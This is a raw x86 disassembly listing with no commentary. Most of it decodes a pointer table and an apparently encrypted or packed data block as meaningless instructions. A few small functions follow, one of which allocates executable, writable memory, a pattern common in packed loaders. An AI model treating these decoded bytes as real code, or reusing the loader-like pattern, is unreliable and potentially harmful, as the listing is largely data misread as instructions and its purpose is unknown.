  444500:	add    BYTE PTR [ebp+ebp*2+0x6da80044],ah
  444507:	inc    esp
  444508:	add    BYTE PTR [ebp+ebp*2+0x6db00044],ch
  44450f:	inc    esp
  444510:	add    BYTE PTR [ebp+ebp*2+0x6db80044],dh
  444517:	inc    esp
  444518:	add    BYTE PTR [ebp+ebp*2+0x6dc00044],bh
  44451f:	inc    esp
  444520:	add    ah,al
  444522:	ins    DWORD PTR es:[edi],dx
  444523:	inc    esp
  444524:	add    al,cl
  444526:	ins    DWORD PTR es:[edi],dx
  444527:	inc    esp
  444528:	add    ah,cl
  44452a:	ins    DWORD PTR es:[edi],dx
  44452b:	inc    esp
  44452c:	add    al,dl
  44452e:	ins    DWORD PTR es:[edi],dx
  44452f:	inc    esp
  444530:	add    ah,dl
  444532:	ins    DWORD PTR es:[edi],dx
  444533:	inc    esp
  444534:	add    al,bl
  444536:	ins    DWORD PTR es:[edi],dx
  444537:	inc    esp
  444538:	add    ah,bl
  44453a:	ins    DWORD PTR es:[edi],dx
  44453b:	inc    esp
  44453c:	add    al,ah
  44453e:	ins    DWORD PTR es:[edi],dx
  44453f:	inc    esp
  444540:	add    ah,ah
  444542:	ins    DWORD PTR es:[edi],dx
  444543:	inc    esp
  444544:	add    al,ch
  444546:	ins    DWORD PTR es:[edi],dx
  444547:	inc    esp
  444548:	add    ah,ch
  44454a:	ins    DWORD PTR es:[edi],dx
  44454b:	inc    esp
  44454c:	add    al,dh
  44454e:	ins    DWORD PTR es:[edi],dx
  44454f:	inc    esp
  444550:	add    ah,dh
  444552:	ins    DWORD PTR es:[edi],dx
  444553:	inc    esp
  444554:	add    al,bh
  444556:	ins    DWORD PTR es:[edi],dx
  444557:	inc    esp
  444558:	add    ah,bh
  44455a:	ins    DWORD PTR es:[edi],dx
  44455b:	inc    esp
  44455c:	add    ah,dl
  44455e:	ins    DWORD PTR es:[edi],dx
  44455f:	inc    esp
  444560:	add    BYTE PTR [eax],al
  444562:	outs   dx,BYTE PTR ds:[esi]
  444563:	inc    esp
  444564:	add    al,ch
  444566:	ins    DWORD PTR es:[edi],dx
  444567:	inc    esp
  444568:	add    BYTE PTR [esi+ebp*2],al
  44456b:	inc    esp
  44456c:	add    BYTE PTR [ebp+ebp*2+0x6e080044],bl
  444573:	inc    esp
  444574:	add    BYTE PTR [esi+ebp*2],cl
  444577:	inc    esp
  444578:	add    BYTE PTR [eax],dl
  44457a:	outs   dx,BYTE PTR ds:[esi]
  44457b:	inc    esp
  44457c:	add    BYTE PTR [esi+ebp*2],dl
  44457f:	inc    esp
  444580:	add    BYTE PTR [eax],bl
  444582:	outs   dx,BYTE PTR ds:[esi]
  444583:	inc    esp
  444584:	add    BYTE PTR [esi+ebp*2],bl
  444587:	inc    esp
  444588:	add    BYTE PTR [eax],ah
  44458a:	outs   dx,BYTE PTR ds:[esi]
  44458b:	inc    esp
  44458c:	add    al,bl
  44458e:	ins    DWORD PTR es:[edi],dx
  44458f:	inc    esp
  444590:	add    BYTE PTR [esi+ebp*2],ah
  444593:	inc    esp
  444594:	add    BYTE PTR [eax],ch
  444596:	outs   dx,BYTE PTR ds:[esi]
  444597:	inc    esp
  444598:	add    BYTE PTR [esi+ebp*2],ch
  44459b:	inc    esp
  44459c:	add    BYTE PTR [eax],dh
  44459e:	outs   dx,BYTE PTR ds:[esi]
  44459f:	inc    esp
  4445a0:	add    BYTE PTR [esi+ebp*2],dh
  4445a3:	inc    esp
  4445a4:	add    BYTE PTR [eax],bh
  4445a6:	outs   dx,BYTE PTR ds:[esi]
  4445a7:	inc    esp
  4445a8:	add    BYTE PTR [esi+ebp*2],bh
  4445ab:	inc    esp
  4445ac:	add    BYTE PTR [eax+0x6e],al
  4445af:	inc    esp
  4445b0:	add    BYTE PTR [esi+ebp*2+0x44],al
  4445b4:	add    BYTE PTR [eax+0x6e],cl
  4445b7:	inc    esp
  4445b8:	add    al,dl
  4445ba:	ins    DWORD PTR es:[edi],dx
  4445bb:	inc    esp
  4445bc:	add    BYTE PTR [esi+ebp*2+0x44],cl
  4445c0:	add    BYTE PTR [eax+0x6e],dl
  4445c3:	inc    esp
  4445c4:	add    BYTE PTR [esi+ebp*2+0x44],dl
  4445c8:	add    ah,bl
  4445ca:	ins    BYTE PTR es:[edi],dx
  4445cb:	inc    esp
  4445cc:	add    BYTE PTR [eax+0x6e],bl
  4445cf:	inc    esp
  4445d0:	add    BYTE PTR [ebp+ebp*2+0x44],dh
  4445d4:	add    BYTE PTR [eax+0x6d],bh
  4445d7:	inc    esp
  4445d8:	add    BYTE PTR [esi+ebp*2+0x44],bl
  4445dc:	add    BYTE PTR [eax+0x6e],ah
  4445df:	inc    esp
  4445e0:	add    BYTE PTR [esi+ebp*2],dl
  4445e3:	inc    esp
  4445e4:	add    BYTE PTR [esi+ebp*2+0x44],ah
  4445e8:	add    BYTE PTR [eax+0x6e],ch
  4445eb:	inc    esp
  4445ec:	add    BYTE PTR [esi+ebp*2+0x44],ch
  4445f0:	add    BYTE PTR [eax+0x6e],dh
  4445f3:	inc    esp
  4445f4:	add    BYTE PTR [esi+ebp*2+0x44],dh
  4445f8:	add    BYTE PTR [eax+0x6e],dl
  4445fb:	inc    esp
  4445fc:	add    BYTE PTR [eax+0x6e],bh
  4445ff:	inc    esp
  444600:	add    BYTE PTR [esi+ebp*2+0x44],bh
  444604:	add    BYTE PTR [eax-0x7bffbb92],al
  44460a:	outs   dx,BYTE PTR ds:[esi]
  44460b:	inc    esp
  44460c:	add    BYTE PTR [eax],bh
  44460e:	outs   dx,BYTE PTR ds:[esi]
  44460f:	inc    esp
  444610:	add    BYTE PTR [eax-0x73ffbb92],cl
  444616:	outs   dx,BYTE PTR ds:[esi]
  444617:	inc    esp
  444618:	add    BYTE PTR [eax-0x6bffbb92],dl
  44461e:	outs   dx,BYTE PTR ds:[esi]
  44461f:	inc    esp
  444620:	add    BYTE PTR [eax-0x63ffbb92],bl
  444626:	outs   dx,BYTE PTR ds:[esi]
  444627:	inc    esp
  444628:	add    BYTE PTR [eax-0x5bffbb92],ah
  44462e:	outs   dx,BYTE PTR ds:[esi]
  44462f:	inc    esp
  444630:	add    BYTE PTR [eax+0x3400446e],ch
  444636:	outs   dx,BYTE PTR ds:[esi]
  444637:	inc    esp
  444638:	add    BYTE PTR [esi+ebp*2+0x6eb00044],ch
  44463f:	inc    esp
  444640:	add    BYTE PTR [esi+ebp*2+0x6eb80044],dh
  444647:	inc    esp
  444648:	add    BYTE PTR [esi+ebp*2+0x6ec00044],bh
  44464f:	inc    esp
  444650:	add    ah,al
  444652:	outs   dx,BYTE PTR ds:[esi]
  444653:	inc    esp
  444654:	add    al,cl
  444656:	outs   dx,BYTE PTR ds:[esi]
  444657:	inc    esp
  444658:	add    ah,cl
  44465a:	outs   dx,BYTE PTR ds:[esi]
  44465b:	inc    esp
  44465c:	add    al,dl
  44465e:	outs   dx,BYTE PTR ds:[esi]
  44465f:	inc    esp
  444660:	add    BYTE PTR [ebp+ebp*2+0x6ed40044],bl
  444667:	inc    esp
  444668:	add    al,bl
  44466a:	outs   dx,BYTE PTR ds:[esi]
  44466b:	inc    esp
  44466c:	add    ah,bl
  44466e:	outs   dx,BYTE PTR ds:[esi]
  44466f:	inc    esp
  444670:	add    al,ah
  444672:	outs   dx,BYTE PTR ds:[esi]
  444673:	inc    esp
  444674:	add    ah,ah
  444676:	outs   dx,BYTE PTR ds:[esi]
  444677:	inc    esp
  444678:	add    al,ch
  44467a:	outs   dx,BYTE PTR ds:[esi]
  44467b:	inc    esp
  44467c:	add    ah,ch
  44467e:	outs   dx,BYTE PTR ds:[esi]
  44467f:	inc    esp
  444680:	add    al,dh
  444682:	outs   dx,BYTE PTR ds:[esi]
  444683:	inc    esp
  444684:	add    ah,ah
  444686:	ins    DWORD PTR es:[edi],dx
  444687:	inc    esp
  444688:	add    ah,dh
  44468a:	outs   dx,BYTE PTR ds:[esi]
  44468b:	inc    esp
  44468c:	add    al,bh
  44468e:	outs   dx,BYTE PTR ds:[esi]
  44468f:	inc    esp
  444690:	add    ah,bh
  444692:	outs   dx,BYTE PTR ds:[esi]
  444693:	inc    esp
  444694:	add    BYTE PTR [eax],al
  444696:	outs   dx,DWORD PTR ds:[esi]
  444697:	inc    esp
  444698:	add    BYTE PTR [edi+ebp*2],al
  44469b:	inc    esp
  44469c:	add    BYTE PTR [eax+0x6e],bl
  44469f:	inc    esp
  4446a0:	add    BYTE PTR [eax],cl
  4446a2:	outs   dx,DWORD PTR ds:[esi]
  4446a3:	inc    esp
  4446a4:	add    BYTE PTR [esi+ebp*2],al
  4446a7:	inc    esp
  4446a8:	add    BYTE PTR [edi+ebp*2],cl
  4446ab:	inc    esp
  4446ac:	add    BYTE PTR [ebp+ebp*2+0x44],ch
  4446b0:	add    al,dl
  4446b2:	outs   dx,BYTE PTR ds:[esi]
  4446b3:	inc    esp
  4446b4:	add    BYTE PTR [eax],dl
  4446b6:	outs   dx,DWORD PTR ds:[esi]
  4446b7:	inc    esp
  4446b8:	add    BYTE PTR [edi+ebp*2],dl
  4446bb:	inc    esp
  4446bc:	add    BYTE PTR [eax],bl
  4446be:	outs   dx,DWORD PTR ds:[esi]
  4446bf:	inc    esp
  4446c0:	add    ah,dh
  4446c2:	ins    BYTE PTR es:[edi],dx
  4446c3:	inc    esp
  4446c4:	add    BYTE PTR [edi+ebp*2],bl
  4446c7:	inc    esp
  4446c8:	add    BYTE PTR [eax],ah
  4446ca:	outs   dx,DWORD PTR ds:[esi]
  4446cb:	inc    esp
  4446cc:	add    BYTE PTR [edi+ebp*2],ah
  4446cf:	inc    esp
  4446d0:	add    BYTE PTR [eax+0x6d],cl
  4446d3:	inc    esp
  4446d4:	add    BYTE PTR [eax],ch
  4446d6:	outs   dx,DWORD PTR ds:[esi]
  4446d7:	inc    esp
  4446d8:	add    BYTE PTR [edi+ebp*2],ch
  4446db:	inc    esp
  4446dc:	add    BYTE PTR [eax],dh
  4446de:	outs   dx,DWORD PTR ds:[esi]
  4446df:	inc    esp
  4446e0:	add    BYTE PTR [edi+ebp*2],dh
  4446e3:	inc    esp
  4446e4:	add    BYTE PTR [eax],bh
  4446e6:	outs   dx,DWORD PTR ds:[esi]
  4446e7:	inc    esp
  4446e8:	add    ah,ch
  4446ea:	ins    BYTE PTR es:[edi],dx
  4446eb:	inc    esp
  4446ec:	add    BYTE PTR [edi+ebp*2],bh
  4446ef:	inc    esp
  4446f0:	add    BYTE PTR [eax+0x6f],al
  4446f3:	inc    esp
  4446f4:	add    BYTE PTR [edi+ebp*2+0x44],al
  4446f8:	add    BYTE PTR [eax+0x6f],cl
  4446fb:	inc    esp
  4446fc:	add    BYTE PTR [edi+ebp*2+0x44],cl
  444700:	add    BYTE PTR [eax+0x6f],dl
  444703:	inc    esp
  444704:	add    BYTE PTR [edi+ebp*2+0x44],dl
  444708:	add    BYTE PTR [eax+0x6f],bl
  44470b:	inc    esp
  44470c:	add    BYTE PTR [edi+ebp*2+0x44],bl
  444710:	add    BYTE PTR [eax+0x6f],ah
  444713:	inc    esp
  444714:	add    BYTE PTR [edi+ebp*2+0x44],ah
  444718:	add    BYTE PTR [eax+0x6f],ch
  44471b:	inc    esp
  44471c:	add    BYTE PTR [edi+ebp*2+0x44],ch
  444720:	add    BYTE PTR [eax+0x6f],dh
  444723:	inc    esp
  444724:	add    al,ah
  444726:	ins    BYTE PTR es:[edi],dx
  444727:	inc    esp
  444728:	add    BYTE PTR [edi+ebp*2+0x44],dh
  44472c:	add    BYTE PTR [eax+0x6f],bh
  44472f:	inc    esp
  444730:	add    ah,ah
  444732:	ins    DWORD PTR es:[edi],dx
  444733:	inc    esp
  444734:	add    BYTE PTR [edi+ebp*2+0x44],bh
  444738:	add    BYTE PTR [eax+0x3800446f],al
  44473e:	outs   dx,DWORD PTR ds:[esi]
  44473f:	inc    esp
  444740:	add    BYTE PTR [edi+ebp*2+0x6f880044],al
  444747:	inc    esp
  444748:	add    BYTE PTR [edi+ebp*2+0x6ee40044],cl
  44474f:	inc    esp
  444750:	add    BYTE PTR [eax-0x6bffbb91],dl
  444756:	outs   dx,DWORD PTR ds:[esi]
  444757:	inc    esp
  444758:	add    BYTE PTR [eax-0x63ffbb91],bl
  44475e:	outs   dx,DWORD PTR ds:[esi]
  44475f:	inc    esp
  444760:	add    BYTE PTR [eax+0x5800446f],cl
  444766:	outs   dx,BYTE PTR ds:[esi]
  444767:	inc    esp
  444768:	add    BYTE PTR [eax-0x5bffbb91],ah
  44476e:	outs   dx,DWORD PTR ds:[esi]
  44476f:	inc    esp
  444770:	add    BYTE PTR [eax-0x53ffbb91],ch
  444776:	outs   dx,DWORD PTR ds:[esi]
  444777:	inc    esp
  444778:	add    BYTE PTR [ebp+ebp*2+0x6d340044],bh
  44477f:	inc    esp
  444780:	add    BYTE PTR [eax-0x4bffbb91],dh
  444786:	outs   dx,DWORD PTR ds:[esi]
  444787:	inc    esp
  444788:	add    BYTE PTR [eax+0x6000446f],bh
  44478e:	ins    DWORD PTR es:[edi],dx
  44478f:	inc    esp
  444790:	add    BYTE PTR [edi+ebp*2+0x6fc00044],bh
  444797:	inc    esp
  444798:	add    BYTE PTR [eax-0x3bffbb93],ah
  44479e:	outs   dx,DWORD PTR ds:[esi]
  44479f:	inc    esp
  4447a0:	add    al,cl
  4447a2:	outs   dx,DWORD PTR ds:[esi]
  4447a3:	inc    esp
  4447a4:	add    ah,cl
  4447a6:	outs   dx,DWORD PTR ds:[esi]
  4447a7:	inc    esp
  4447a8:	add    BYTE PTR [ebp*2+0x6fd00044],dh
  4447af:	inc    esp
  4447b0:	add    BYTE PTR [ebp+ebp*2+0x6fd40044],dl
  4447b7:	inc    esp
  4447b8:	add    al,bl
  4447ba:	outs   dx,DWORD PTR ds:[esi]
  4447bb:	inc    esp
  4447bc:	add    ah,bl
  4447be:	outs   dx,DWORD PTR ds:[esi]
  4447bf:	inc    esp
  4447c0:	add    al,ah
  4447c2:	outs   dx,DWORD PTR ds:[esi]
  4447c3:	inc    esp
  4447c4:	add    ah,ah
  4447c6:	outs   dx,DWORD PTR ds:[esi]
  4447c7:	inc    esp
  4447c8:	add    al,ch
  4447ca:	outs   dx,DWORD PTR ds:[esi]
  4447cb:	inc    esp
  4447cc:	add    al,dl
  4447ce:	ins    BYTE PTR es:[edi],dx
  4447cf:	inc    esp
  4447d0:	add    al,al
  4447d2:	outs   dx,DWORD PTR ds:[esi]
  4447d3:	inc    esp
  4447d4:	add    BYTE PTR [eax],bh
  4447d6:	outs   dx,BYTE PTR ds:[esi]
  4447d7:	inc    esp
  4447d8:	add    ah,ch
  4447da:	outs   dx,DWORD PTR ds:[esi]
  4447db:	inc    esp
  4447dc:	add    al,dh
  4447de:	outs   dx,DWORD PTR ds:[esi]
  4447df:	inc    esp
  4447e0:	add    ah,dh
  4447e2:	outs   dx,DWORD PTR ds:[esi]
  4447e3:	inc    esp
  4447e4:	add    al,bh
  4447e6:	outs   dx,DWORD PTR ds:[esi]
  4447e7:	inc    esp
  4447e8:	add    ah,bh
  4447ea:	outs   dx,DWORD PTR ds:[esi]
  4447eb:	inc    esp
  4447ec:	add    BYTE PTR [eax],al
  4447ee:	jo     0x444834
  4447f0:	add    BYTE PTR [eax+esi*2],al
  4447f3:	inc    esp
  4447f4:	add    BYTE PTR [eax],cl
  4447f6:	jo     0x44483c
  4447f8:	add    ah,cl
  4447fa:	ins    BYTE PTR es:[edi],dx
  4447fb:	inc    esp
  4447fc:	add    BYTE PTR [eax+esi*2],cl
  4447ff:	inc    esp
  444800:	add    BYTE PTR [eax],dl
  444802:	jo     0x444848
  444804:	add    BYTE PTR [eax+esi*2],dl
  444807:	inc    esp
  444808:	add    BYTE PTR [eax+0x1800446f],ah
  44480e:	jo     0x444854
  444810:	add    al,ah
  444812:	ins    BYTE PTR es:[edi],dx
  444813:	inc    esp
  444814:	add    BYTE PTR [eax+esi*2],bl
  444817:	inc    esp
  444818:	add    BYTE PTR [eax+0x5800446d],cl
  44481e:	outs   dx,BYTE PTR ds:[esi]
  44481f:	inc    esp
  444820:	add    BYTE PTR [eax],ah
  444822:	jo     0x444868
  444824:	add    BYTE PTR [eax+esi*2],ah
  444827:	inc    esp
  444828:	add    BYTE PTR [eax],ch
  44482a:	jo     0x444870
  44482c:	add    BYTE PTR [eax+esi*2],ch
  44482f:	inc    esp
  444830:	add    BYTE PTR [eax],dh
  444832:	jo     0x444878
  444834:	add    BYTE PTR [eax+esi*2],dh
  444837:	inc    esp
  444838:	add    BYTE PTR [ebp*2+0x70380044],al
  44483f:	inc    esp
  444840:	add    BYTE PTR [eax+esi*2],bh
  444843:	inc    esp
  444844:	add    BYTE PTR [eax+0x70],al
  444847:	inc    esp
  444848:	add    BYTE PTR [eax+esi*2+0x44],al
  44484c:	add    BYTE PTR [eax+0x70],cl
  44484f:	inc    esp
  444850:	add    BYTE PTR [eax+esi*2+0x44],cl
  444854:	add    BYTE PTR [eax+0x70],dl
  444857:	inc    esp
  444858:	add    BYTE PTR [eax],ch
  44485a:	ins    DWORD PTR es:[edi],dx
  44485b:	inc    esp
  44485c:	add    BYTE PTR [eax+esi*2+0x44],dl
  444860:	add    BYTE PTR [eax+0x70],bl
  444863:	inc    esp
  444864:	add    BYTE PTR [eax+esi*2+0x44],bl
  444868:	add    BYTE PTR [eax+0x6e],dh
  44486b:	inc    esp
  44486c:	add    BYTE PTR [eax+0x70],ah
  44486f:	inc    esp
  444870:	add    BYTE PTR [eax+esi*2+0x44],ah
  444874:	add    BYTE PTR [ebp*2+0x70680044],bh
  44487b:	inc    esp
  44487c:	add    BYTE PTR [esi+ebp*2],dl
  44487f:	inc    esp
  444880:	add    BYTE PTR [eax+esi*2+0x44],ch
  444884:	add    BYTE PTR [eax+0x70],dh
  444887:	inc    esp
  444888:	add    BYTE PTR [eax+esi*2+0x44],dh
  44488c:	add    BYTE PTR [eax+0x70],bh
  44488f:	inc    esp
  444890:	add    BYTE PTR [eax+esi*2+0x44],bh
  444894:	add    BYTE PTR [eax+0x54004470],al
  44489a:	ins    DWORD PTR es:[edi],dx
  44489b:	inc    esp
  44489c:	add    BYTE PTR [eax+esi*2+0x6f800044],al
  4448a3:	inc    esp
  4448a4:	add    BYTE PTR [eax-0x73ffbb90],cl
  4448aa:	jo     0x4448f0
  4448ac:	add    ah,dl
  4448ae:	ins    BYTE PTR es:[edi],dx
  4448af:	inc    esp
  4448b0:	add    BYTE PTR [eax+0x4470],dl
  4448b6:	outs   dx,DWORD PTR ds:[esi]
  4448b7:	inc    esp
  4448b8:	add    BYTE PTR [eax+esi*2+0x70980044],dl
  4448bf:	inc    esp
  4448c0:	add    BYTE PTR [eax],bh
  4448c2:	outs   dx,BYTE PTR ds:[esi]
  4448c3:	inc    esp
  4448c4:	add    BYTE PTR [eax+esi*2+0x44],ch
  4448c8:	add    BYTE PTR [eax+esi*2+0x70a00044],bl
  4448cf:	inc    esp
  4448d0:	add    BYTE PTR [esi],cl
  4448d2:	stos   BYTE PTR es:[edi],al
  4448d3:	mov    al,ds:0x3b222ad8
  4448d8:	sbb    eax,0xc075f0e8
  4448dd:	pop    esp
  4448de:	jb     0x444864
  4448e0:	and    ch,BYTE PTR [ebp+0x40]
  4448e3:	pop    ecx
  4448e4:	sbb    BYTE PTR [edi-0x50d45214],dl
  4448ea:	dec    eax
  4448eb:	scas   eax,DWORD PTR es:[edi]
  4448ec:	fsub   DWORD PTR [edx-0x45]
  4448ef:	imul   esp,DWORD PTR [eax+0x3d287705],0x93621d7
  4448f9:	mov    ecx,0x9ce2bd61
  4448fe:	pop    ss
  4448ff:	in     al,dx
  444900:	ss mov al,0x1
  444903:	push   0xf3e84859
  444908:	inc    ebp
  444909:	ja     0x444928
  44490b:	xchg   DWORD PTR [ebx],ebx
  44490d:	push   esp
  44490e:	in     al,0x20
  444910:	xchg   ecx,eax
  444911:	jns    0x44496e
  444913:	push   es
  444914:	inc    esp
  444915:	data16 jmp 0x4448b8
  444918:	fmul   DWORD PTR [ecx-0x2d]
  44491b:	ret    
  44491c:	and    BYTE PTR [ebx],bh
  44491e:	shld   DWORD PTR [ebp-0x1f],edi,cl
  444922:	fldenv ds:0x499aa319
  444928:	jmp    0x4448d2
  44492a:	cmp    ebx,eax
  44492c:	mov    dl,0x95
  44492e:	ins    BYTE PTR es:[edi],dx
  44492f:	aam    0xe7
  444931:	pop    ebp
  444932:	cmp    BYTE PTR [edi],dl
  444934:	mov    bh,0xd7
  444936:	repnz inc esi
  444938:	sahf   
  444939:	cld    
  44493a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44493b:	imul   ebx,DWORD PTR [ebp+0x5e93c33e],0x87a5f22
  444945:	adc    eax,0x13c59b5c
  44494a:	lods   al,BYTE PTR ds:[esi]
  44494b:	jbe    0x4448d9
  44494d:	sub    edi,DWORD PTR [eax-0x2d]
  444950:	les    esp,FWORD PTR [ebx]
  444952:	fwait
  444953:	pushf  
  444954:	lods   eax,DWORD PTR ds:[esi]
  444955:	es out dx,al
  444957:	jl     0x444908
  444959:	ficom  WORD PTR [ebp+eax*1+0x6d]
  44495d:	in     al,dx
  44495e:	mov    ds:0x87e9b706,al
  444963:	push   es
  444964:	sbb    esi,ecx
  444966:	out    dx,al
  444967:	nop
  444968:	mov    esi,0xff9b732b
  44496d:	scas   eax,DWORD PTR es:[edi]
  44496e:	sar    BYTE PTR [ebp-0x33],cl
  444971:	fcom   DWORD PTR [ebp-0x56acbc13]
  444977:	lock push esp
  444979:	data16 je 0x444969
  44497c:	mov    eax,0xe80ba21d
  444981:	jle    0x44491d
  444983:	dec    ebx
  444984:	jp     0x444929
  444986:	sahf   
  444987:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444988:	push   esp
  444989:	push   eax
  44498a:	daa    
  44498b:	ins    DWORD PTR es:[edi],dx
  44498c:	int    0xc5
  44498e:	enter  0x4e3c,0x8d
  444992:	push   ebx
  444993:	xchg   ebx,eax
  444994:	adc    eax,ebx
  444996:	push   eax
  444997:	mov    ecx,0x75a0d416
  44499c:	dec    esp
  44499d:	add    eax,0xe17b0054
  4449a2:	cmp    al,BYTE PTR [esi-0x49]
  4449a5:	test   ebx,eax
  4449a7:	mov    al,ds:0x196c4be3
  4449ac:	mov    esi,0xa2d99a81
  4449b1:	jmp    0xfc770429
  4449b6:	jns    0x444945
  4449b8:	mov    eax,ds:0x5864e932
  4449bd:	iret   
  4449be:	dec    esp
  4449bf:	shl    BYTE PTR [edx+ebx*2-0x4d],1
  4449c3:	lea    edi,[ecx+0x3a]
  4449c6:	push   esp
  4449c7:	push   ss
  4449c8:	test   al,0xea
  4449ca:	fiadd  WORD PTR [eax-0x16]
  4449cd:	(bad)  
  4449ce:	push   ss
  4449cf:	xchg   edi,eax
  4449d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4449d1:	xor    eax,0x939aeb0
  4449d6:	mov    esp,0x168775e2
  4449db:	jecxz  0x44496f
  4449dd:	arpl   WORD PTR [ebx+ebp*8],ax
  4449e0:	lahf   
  4449e1:	std    
  4449e2:	or     DWORD PTR [ecx],0xffffff8c
  4449e5:	pop    ecx
  4449e6:	aas    
  4449e7:	pushf  
  4449e8:	outs   dx,DWORD PTR ds:[esi]
  4449e9:	jmp    0x444a1e
  4449eb:	mov    bh,0x29
  4449ed:	mov    bh,0x16
  4449ef:	gs loopne 0x4449c8
  4449f2:	adc    eax,0xc32eb431
  4449f7:	(bad)  
  4449f9:	inc    esi
  4449fa:	aas    
  4449fb:	pop    DWORD PTR [eax+ecx*2+0x47881ea2]
  444a02:	popa   
  444a03:	loopne 0x444a28
  444a05:	dec    ecx
  444a06:	(bad)  
  444a07:	mov    edi,0x1138bd90
  444a0c:	inc    eax
  444a0d:	or     al,0xe7
  444a0f:	push   0x74b57da
  444a14:	es push es
  444a16:	ret    
  444a17:	adc    al,ah
  444a19:	mov    dl,0x24
  444a1b:	ins    DWORD PTR es:[edi],dx
  444a1c:	out    0x60,al
  444a1e:	jmp    0x986aa2e3
  444a23:	mov    ds:0x57d29a20,eax
  444a28:	jp     0x444a25
  444a2a:	cmpxchg8b QWORD PTR [esi-0x7e]
  444a2e:	rol    BYTE PTR [edx+0x69b04cf8],0x2
  444a35:	lods   eax,DWORD PTR ds:[esi]
  444a36:	mov    ebx,0xd574e43f
  444a3b:	scas   al,BYTE PTR es:[edi]
  444a3c:	mov    dh,0xcd
  444a3e:	pop    eax
  444a3f:	sti    
  444a40:	push   0xffffffd0
  444a42:	mov    eax,ds:0xdff6cc98
  444a47:	sub    esp,0x33
  444a4a:	icebp  
  444a4b:	pop    ss
  444a4c:	sbb    ecx,DWORD PTR [ebx+esi*4]
  444a4f:	add    DWORD PTR [esp+esi*4],eax
  444a52:	gs pop eax
  444a54:	lea    ecx,[edx+0x70b137b9]
  444a5a:	loop   0x444aaa
  444a5c:	retf   
  444a5d:	push   ebx
  444a5e:	push   ds
  444a5f:	mov    al,0x11
  444a61:	xchg   ebp,eax
  444a62:	push   0xcc7253c5
  444a67:	mov    ch,0x5a
  444a69:	outs   dx,BYTE PTR ds:[esi]
  444a6a:	sti    
  444a6b:	or     esp,DWORD PTR [eax+0x1]
  444a6e:	push   es
  444a6f:	xor    esi,DWORD PTR [esi]
  444a71:	pusha  
  444a72:	retf   
  444a73:	sub    edi,edi
  444a75:	sub    bh,BYTE PTR [esi]
  444a77:	pusha  
  444a78:	jne    0x444af7
  444a7a:	add    al,BYTE PTR [esi]
  444a7c:	and    eax,esp
  444a7e:	mov    bh,0x31
  444a80:	mov    WORD PTR [edi+edi*8],?
  444a83:	add    eax,0xacde2581
  444a88:	les    edi,FWORD PTR [edi]
  444a8a:	mov    ecx,0x18ca5e45
  444a8f:	mov    ds:0x8aad862a,al
  444a94:	sbb    al,0x99
  444a96:	mul    BYTE PTR [esi+0x5b]
  444a99:	pop    ebx
  444a9a:	jne    0x444a8f
  444a9c:	je     0x444a6c
  444a9e:	push   edx
  444a9f:	mov    bl,bh
  444aa1:	(bad)  
  444aa2:	mov    al,0x8c
  444aa4:	adc    al,0x33
  444aa6:	jg     0x444abf
  444aa8:	lods   al,BYTE PTR ds:[esi]
  444aa9:	dec    eax
  444aaa:	lea    esi,[ecx-0x57]
  444aad:	and    dh,BYTE PTR [eax]
  444aaf:	mov    dl,0x7e
  444ab1:	loopne 0x444a52
  444ab3:	push   edi
  444ab4:	lock inc edx
  444ab6:	les    ebx,FWORD PTR [edx+0x4d]
  444ab9:	pop    esi
  444aba:	in     eax,0xae
  444abc:	shl    dl,0x5a
  444abf:	jmp    0x444ae7
  444ac1:	fisubr DWORD PTR ds:0xe4327bbe
  444ac7:	or     eax,0x2591a27e
  444acc:	xchg   ecx,eax
  444acd:	(bad)  
  444ace:	jb     0x444aeb
  444ad0:	and    eax,0xcccccccc
  444ad5:	int3   
  444ad6:	int3   
  444ad7:	int3   
  444ad8:	int3   
  444ad9:	int3   
  444ada:	int3   
  444adb:	int3   
  444adc:	int3   
  444add:	int3   
  444ade:	int3   
  444adf:	int3   
  444ae0:	push   ebp
  444ae1:	mov    ebp,esp
  444ae3:	sub    esp,0xc
  444ae6:	mov    DWORD PTR [ebp-0x8],0x1e4dc
  444aed:	mov    DWORD PTR [ebp-0xc],0x3000
  444af4:	mov    DWORD PTR [ebp-0x4],0x40
  444afb:	mov    eax,DWORD PTR [ebp-0x4]
  444afe:	push   eax
  444aff:	mov    ecx,DWORD PTR [ebp-0xc]
  444b02:	push   ecx
  444b03:	mov    edx,DWORD PTR [ebp+0x8]
  444b06:	push   edx
  444b07:	push   0x0
  444b09:	call   DWORD PTR ds:0x446cb4
  444b0f:	mov    esp,ebp
  444b11:	pop    ebp
  444b12:	ret    
  444b13:	int3   
  444b14:	int3   
  444b15:	int3   
  444b16:	int3   
  444b17:	int3   
  444b18:	int3   
  444b19:	int3   
  444b1a:	int3   
  444b1b:	int3   
  444b1c:	int3   
  444b1d:	int3   
  444b1e:	int3   
  444b1f:	int3   
  444b20:	push   ebp
  444b21:	mov    ebp,esp
  444b23:	pop    ebp
  444b24:	ret    
  444b25:	int3   
  444b26:	int3   
  444b27:	int3   
  444b28:	int3   
  444b29:	int3   
  444b2a:	int3   
  444b2b:	int3   
  444b2c:	int3   
  444b2d:	int3   
  444b2e:	int3   
  444b2f:	int3   
  444b30:	push   ebp
  444b31:	mov    ebp,esp
  444b33:	sub    esp,0x8
  444b36:	mov    eax,DWORD PTR [ebp+0x8]
  444b39:	mov    DWORD PTR [ebp-0x4],eax
  444b3c:	mov    ecx,DWORD PTR [ebp+0xc]
  444b3f:	mov    DWORD PTR [ebp-0x8],ecx
  444b42:	mov    edx,DWORD PTR [ebp-0x4]
  444b45:	cmp    edx,DWORD PTR [ebp-0x8]
  444b48:	jae    0x444b51
  444b4a:	mov    eax,DWORD PTR [ebp-0x4]
  444b4d:	jmp    0x444b54
  444b4f:	jmp    0x444b54
  444b51:	mov    eax,DWORD PTR [ebp-0x8]
  444b54:	mov    esp,ebp
  444b56:	pop    ebp
  444b57:	ret    
  444b58:	int3   
  444b59:	int3   
  444b5a:	int3   
  444b5b:	int3   
  444b5c:	int3   
  444b5d:	int3   
  444b5e:	int3   
  444b5f:	int3   
  444b60:	push   ebp
  444b61:	mov    ebp,esp
  444b63:	mov    DWORD PTR ds:0x449e28,0x401004
  444b6d:	pop    ebp
  444b6e:	ret    
  444b6f:	int3   
  444b70:	push   ebp
  444b71:	mov    ebp,esp
  444b73:	mov    DWORD PTR ds:0x449e28,0x4438b7
  444b7d:	pop    ebp
  444b7e:	ret    
  444b7f:	int3   
  444b80:	push   ebp
  444b81:	mov    ebp,esp
  444b83:	mov    eax,DWORD PTR [ebp+0x8]
